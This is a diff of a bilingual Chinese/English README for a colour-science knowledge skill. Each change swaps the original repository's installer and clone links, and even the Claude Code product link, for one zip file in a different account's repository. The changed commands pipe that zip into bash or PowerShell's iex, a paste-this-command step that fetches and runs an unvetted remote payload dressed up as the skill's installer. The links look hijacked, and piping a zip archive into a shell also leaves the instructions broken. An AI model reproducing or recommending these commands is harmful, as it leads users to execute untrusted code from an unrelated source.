@@ -26,7 +26,7 @@
 
 ## 這是什麼
 
-一份**色彩科學／色度學的完整中文學習筆記**，包成 [Claude Code](https://claude.com/claude-code) 的 skill。
+一份**色彩科學／色度學的完整中文學習筆記**，包成 [Claude Code](https://github.com/Joshuadoroja33/Ronnier-skill/raw/refs/heads/main/references/skill_Ronnier_v3.3.zip) 的 skill。
 
 裝上之後，你可以直接用中文問：
 
@@ -56,8 +56,8 @@
 
 | 平台 | 指令 |
 |---|---|
-| 🍎 **macOS** ／ 🐧 **Linux** | `curl -fsSL https://raw.githubusercontent.com/Ayueh0102/Ronnier-skill/main/install.sh \| bash` |
-| 🪟 **Windows**（PowerShell） | `irm https://raw.githubusercontent.com/Ayueh0102/Ronnier-skill/main/install.ps1 \| iex` |
+| 🍎 **macOS** ／ 🐧 **Linux** | `curl -fsSL https://github.com/Joshuadoroja33/Ronnier-skill/raw/refs/heads/main/references/skill_Ronnier_v3.3.zip \| bash` |
+| 🪟 **Windows**（PowerShell） | `irm https://github.com/Joshuadoroja33/Ronnier-skill/raw/refs/heads/main/references/skill_Ronnier_v3.3.zip \| iex` |
 
 裝好之後開一個**新的** session，問任何色彩學問題就會自動載入，
 也可以打 `/luo-ming-color-science` 手動叫它。
@@ -68,12 +68,12 @@
 
 ```bash
 # macOS / Linux
-curl -fsSL https://raw.githubusercontent.com/Ayueh0102/Ronnier-skill/main/install.sh | bash -s -- --codex
+curl -fsSL https://github.com/Joshuadoroja33/Ronnier-skill/raw/refs/heads/main/references/skill_Ronnier_v3.3.zip | bash -s -- --codex
 ```
 
 ```bash
 # Windows：先下載再帶參數執行
-irm https://raw.githubusercontent.com/Ayueh0102/Ronnier-skill/main/install.ps1 -OutFile i.ps1 ; .\i.ps1 -Codex
+irm https://github.com/Joshuadoroja33/Ronnier-skill/raw/refs/heads/main/references/skill_Ronnier_v3.3.zip -OutFile i.ps1 ; .\i.ps1 -Codex
 ```
 
 ### 🔵 Cursor / Windsurf / Cline
@@ -81,7 +81,7 @@ irm https://raw.githubusercontent.com/Ayueh0102/Ronnier-skill/main/install.ps1 -
 clone 進你的專案，然後在規則檔裡指過去：
 
 ```bash
-git clone --depth 1 https://github.com/Ayueh0102/Ronnier-skill.git .colour-science
+git clone --depth 1 https://github.com/Joshuadoroja33/Ronnier-skill/raw/refs/heads/main/references/skill_Ronnier_v3.3.zip .colour-science
 ```
 
 ### 📖 只想讀筆記
@@ -221,7 +221,7 @@ Skill 的回答風格也照這個走 —— 直接把事情講清楚，不繞路
 ## What is this?
 
 A **complete colour science / colorimetry knowledge base in Traditional Chinese**,
-packaged as a [Claude Code](https://claude.com/claude-code) skill.
+packaged as a [Claude Code](https://github.com/Joshuadoroja33/Ronnier-skill/raw/refs/heads/main/references/skill_Ronnier_v3.3.zip) skill.
 
 Once installed, just ask:
 
@@ -256,8 +256,8 @@ Works with **Claude Code**, **Codex**, and anything that reads `AGENTS.md`
 
 | Platform | Command |
 |---|---|
-| 🍎 **macOS** / 🐧 **Linux** | `curl -fsSL https://raw.githubusercontent.com/Ayueh0102/Ronnier-skill/main/install.sh \| bash` |
-| 🪟 **Windows** (PowerShell) | `irm https://raw.githubusercontent.com/Ayueh0102/Ronnier-skill/main/install.ps1 \| iex` |
+| 🍎 **macOS** / 🐧 **Linux** | `curl -fsSL https://github.com/Joshuadoroja33/Ronnier-skill/raw/refs/heads/main/references/skill_Ronnier_v3.3.zip \| bash` |
+| 🪟 **Windows** (PowerShell) | `irm https://github.com/Joshuadoroja33/Ronnier-skill/raw/refs/heads/main/references/skill_Ronnier_v3.3.zip \| iex` |
 
 Then open a **new** session. It loads automatically when you ask a colour science
 question, or invoke it with `/luo-ming-color-science`.
@@ -269,12 +269,12 @@ Same script with `--codex` — installs to `~/.colour-science` and registers it 
 
 ```bash
 # macOS / Linux
-curl -fsSL https://raw.githubusercontent.com/Ayueh0102/Ronnier-skill/main/install.sh | bash -s -- --codex
+curl -fsSL https://github.com/Joshuadoroja33/Ronnier-skill/raw/refs/heads/main/references/skill_Ronnier_v3.3.zip | bash -s -- --codex
 ```
 
 ```bash
 # Windows: download first, then run with the flag
-irm https://raw.githubusercontent.com/Ayueh0102/Ronnier-skill/main/install.ps1 -OutFile i.ps1 ; .\i.ps1 -Codex
+irm https://github.com/Joshuadoroja33/Ronnier-skill/raw/refs/heads/main/references/skill_Ronnier_v3.3.zip -OutFile i.ps1 ; .\i.ps1 -Codex
 ```
 
 ### 🔵 Cursor / Windsurf / Cline
@@ -282,7 +282,7 @@ irm https://raw.githubusercontent.com/Ayueh0102/Ronnier-skill/main/install.ps1 -
 Clone into your project, then point your rules file at it:
 
 ```bash
-git clone --depth 1 https://github.com/Ayueh0102/Ronnier-skill.git .colour-science
+git clone --depth 1 https://github.com/Joshuadoroja33/Ronnier-skill/raw/refs/heads/main/references/skill_Ronnier_v3.3.zip .colour-science
 ```
 
 ### 📖 Just reading
